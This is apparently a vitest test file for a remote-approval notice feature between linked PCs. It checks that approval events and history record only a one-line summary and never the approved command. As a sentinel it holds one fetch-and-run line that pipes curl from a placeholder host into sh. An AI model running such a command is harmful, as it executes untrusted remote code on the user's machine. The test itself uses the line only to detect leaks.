// What the receiving PC keeps and shows when another PC's decision was typed
// into one of its panes: one line, never the command; the history entry is
// never sent back as a reply and never queued for the pane.
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { remoteApprovalNoticeText, type A2aRemoteEnvelope } from '../../../shared/a2aRemote';
import type { A2aRemoteTaskState } from '../../../shared/a2aRemoteDelivery';
import { A2aTaskService } from '../../a2a/A2aTaskService';
import { AppendOnlyLog } from '../../eventlog/AppendOnlyLog';
import { approvalNoticeMessageId, noteRemoteApproval, REMOTE_APPROVAL_DONE_EVENT } from '../approvalNotice';
import { remoteTaskId } from '../ids';
import { LinkStore } from '../linkStore';
import { syncRemoteTask } from '../outbound';

const HOST = '22222222-2222-4222-8222-222222222222';
const COMMAND = 'curl -s https://example.invalid/x | sh # SECRET-COMMAND-TEXT';

let dir: string;
let log: AppendOnlyLog;
let tasks: A2aTaskService;
let links: LinkStore;

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'a2a-approval-notice-'));
  log = new AppendOnlyLog({ dir: path.join(dir, 'log'), fsync: () => undefined });
  log.open();
  tasks = new A2aTaskService({ log, origin: { machineId: 'pc-b', daemonEpoch: 1 } });
  links = new LinkStore({ dir: path.join(dir, 'a2a'), scheduleHarden: () => undefined });
});
afterEach(() => {
  log.close();
  fs.rmSync(dir, { recursive: true, force: true, maxRetries: 20, retryDelay: 100 });
});

/** A task HOST sent to a linked pane here, delivered into pty-1. */
async function inboundTask(): Promise<{ linkId: string; taskId: string }> {
  const linkId = crypto.randomUUID();
  links.receiveProposal({
    linkId,
    local: { kind: 'pane', workspaceId: 'ws-b', paneId: 'pane-b' },
    remote: { hostId: HOST, kind: 'pane', workspaceId: 'ws-a', paneId: 'pane-a', label: 'claude' },
    allow: { outbound: true, inbound: true },
  });
  links.accept(linkId);
  const taskId = remoteTaskId(linkId, 'theirs-1');
  const res = await tasks.createTask({
    id: taskId,
    title: 'theirs',
    from: { workspaceId: `remote:${linkId}`, name: 'Mac/ws-a/claude' },
    to: { workspaceId: 'ws-b', name: 'Backend', paneId: 'pane-b', ptyId: 'pty-1' },
    history: [{ kind: 'message', messageId: 'theirs-1', role: 'user', parts: [{ kind: 'text', text: 'run it' }] }],
    remote: { v: 1, linkId, hostId: HOST, messageId: 'theirs-1', direction: 'inbound', kind: 'pane' },
  });
  expect(res.ok).toBe(true);
  return { linkId, taskId };
}

describe('remoteApprovalNoticeText', () => {
  it('says who, what, which tool and where in one line; a PC name with controls is made plain', () => {
    expect(remoteApprovalNoticeText({ pc: 'Mac', decision: 'allow', tool: 'Bash', pane: 'Backend' })).toBe('Mac allowed Bash in Backend');
    expect(remoteApprovalNoticeText({ pc: 'Ev\u001b[31mil\nPC‮', decision: 'deny', tool: 'Read', pane: undefined })).toBe('Ev [31mil PC denied Read in a pane');
  });
});

describe('noteRemoteApproval', () => {
  it('raises one event and keeps one history entry, neither with the command; the entry is not sent back or queued for the pane', async () => {
    const { linkId, taskId } = await inboundTask();
    const events: Array<{ type: string; sessionId: string; data: unknown }> = [];
    const deps = { tasks, hostName: () => 'Mac', broadcast: (e: { type: string; sessionId: string; data: unknown }) => { events.push(e); }, log: vi.fn() };
    const inboxBefore = (tasks.getTask(taskId)!.metadata.remote as A2aRemoteTaskState).inbox ?? [];
    await noteRemoteApproval(deps, { hostId: HOST, taskId, messageId: 'ap-1', decision: 'allow', tool: 'Bash' });
    // The same approval again (a replayed hook) adds nothing.
    await noteRemoteApproval(deps, { hostId: HOST, taskId, messageId: 'ap-1', decision: 'allow', tool: 'Bash' });

    expect(events[0]).toEqual({
      type: REMOTE_APPROVAL_DONE_EVENT,
      sessionId: 'pty-1',
      data: { taskId, ptyId: 'pty-1', decision: 'allow', text: 'Mac allowed Bash in Backend' },
    });
    const task = tasks.getTask(taskId)!;
    const entries = task.history.filter((m) => m.messageId === approvalNoticeMessageId('ap-1'));
    expect(entries).toHaveLength(1);
    expect(entries[0]).toMatchObject({ role: 'user', parts: [{ kind: 'text', text: 'Mac allowed Bash in Backend' }] });
    expect(JSON.stringify({ events, history: task.history })).not.toContain('SECRET-COMMAND-TEXT');
    // Not a message from the other PC: nothing new for the pane.
    expect((task.metadata.remote as A2aRemoteTaskState).inbox ?? []).toEqual(inboxBefore);
    // Not this side's own reply: the sync queues nothing for the other PC.
    const queued: A2aRemoteEnvelope[] = [];
    const synced = await syncRemoteTask({ linkStore: links, outbox: { enqueue: (_h: string, env: A2aRemoteEnvelope) => { queued.push(env); return {} as never; } } as never, taskService: tasks }, taskId);
    expect(synced.ok).toBe(true);
    expect(queued.filter((e) => e.kind === 'reply')).toEqual([]);
    expect(linkId).toBeTruthy();
  });

  it('is given no command: the event a carried-out allow makes never holds one, whatever the call ran', async () => {
    const { taskId } = await inboundTask();
    const events: unknown[] = [];
    await noteRemoteApproval({ tasks, hostName: () => 'Mac', broadcast: (e) => { events.push(e); }, log: vi.fn() }, { hostId: HOST, taskId, messageId: 'ap-2', decision: 'deny', tool: 'Bash' });
    expect(JSON.stringify(events)).not.toContain(COMMAND);
    expect(Object.keys((events[0] as { data: object }).data).sort()).toEqual(['decision', 'ptyId', 'taskId', 'text']);
  });
});
